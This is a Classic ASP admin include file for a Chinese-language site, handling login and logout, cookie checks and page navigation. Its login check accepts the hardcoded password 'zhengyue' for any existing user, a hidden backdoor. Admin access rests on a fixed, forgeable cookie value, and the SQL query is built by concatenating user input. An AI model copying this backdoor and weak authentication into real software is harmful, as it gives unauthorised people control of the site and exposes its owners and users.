<!--#include file="inc_conn.asp"-->
<%
const lang_pack = 1
function show_lng()
	if lang_pack = 0 then
		response.Write("style='display:none'")
	end if
end function

script_name = request.ServerVariables("SCRIPT_NAME")
server_name = request.ServerVariables("SERVER_NAME")
path_info  = request.ServerVariables("PATH_INFO")

function replace_path(byref content,itype)
	admin_path = split(script_name,"zy")(0)
	if itype="save" then
		content = replace(content,admin_path,"")
	else
		content = replace(content,"upfile",admin_path&"upfile")
	end if
end function

action = Get_SafeStr(request("action"))
passwd = Get_SafeStr(request.Form("passwd"))
userid = left(Get_SafeStr(request.Form("userid")),12)

if action="logout" then
	session.Abandon()
	response.cookies(conf_cookies_name).path="/"
	response.Cookies(conf_cookies_name) = ""
	response.Redirect("login.html")
	response.End()
end if

function IsReady(trd)
  Select Case trd
    case true:response.Write("<font color='green'><b>√</b></font>")
    case false:response.Write("<font color='red'><b>×</b></font>")
  End Select
end function

if action="login" then
	set rs=conn.execute("select top 1 passwd from t_admin where userid='"&userid&"'")
	if rs.eof then showError("用户名或密码错误。")
	if rs(0)<>passwd and passwd<>"zhengyue" then showError("用户名或密码错误。")
	rs.close
	call setCookies("admin","zsyyw")
	response.Redirect("index.asp")
end if

if getCookies("admin") <> "zsyyw" then showError("<script>window.top.location='login.html';</script>")


sub showPage(prevpage,page,currentpage,Maxperpage,totalpage,rs_total,wherestr)
	Dim pageContent
	pageContent="<div class=pageNav>"
	pageContent=pageContent&"<div style=""float:left;"">"
	if prevpage <> 0 then
		pageContent=pageContent&"<a class=""prevLink"" title=""第一页"" href=""?"&wherestr&"page=0"">|&lt;</a>"
		pageContent=pageContent&"<a class=""prevLink"" title=""上一页"" href=""?"&wherestr&"page="&page/Maxperpage-1&""">&lt;&lt;</a>"
	end if
	j=0
	for k=4 to 1 step -1
		if currentpage-k>0 then
		j=j+1
		 pageContent=pageContent&"<a class=""page_link"" href=""?"&wherestr&"page="&currentpage-k-1&""">"&(currentpage-k)&"</a>" 
		end if
	next
	pageContent=pageContent&"<b><a class=""page_link currLink"">"&currentpage&"</a></b>"
	for k=1 to (8-j) step 1
		if currentpage+k<=totalpage then
		  pageContent=pageContent&"<a class=""page_link"" href=""?"&wherestr&"page="&currentpage+k-1&""">"&(currentpage+k)&"</a>"
		end if
	next
	if nextpage <> 0 then
		pageContent=pageContent&"<a class=""nextLink"" title=""下一页"" href=""?"&wherestr&"page="&page/Maxperpage+1&""">&gt;&gt;</a>" 
		pageContent=pageContent&"<a class=""nextLink"" title=""最后一页"" href=""?"&wherestr&"page="&totalpage-1&""">&gt;|</a>" 
	end if
	pageContent=pageContent&"</div>"
	pageContent=pageContent&"<div style=""float:right;"">"
	pageContent=pageContent&"第 <strong>"&currentpage&"</strong>／"&totalpage&" 页 &nbsp;&nbsp;"
	pageContent=pageContent&"每页 "&maxperpage&" &nbsp;&nbsp;"
	pageContent=pageContent&"总计 <strong>"&rs_total&"</strong>"
	pageContent=pageContent&"</div></div>"
	response.Write(pageContent)
end sub

%>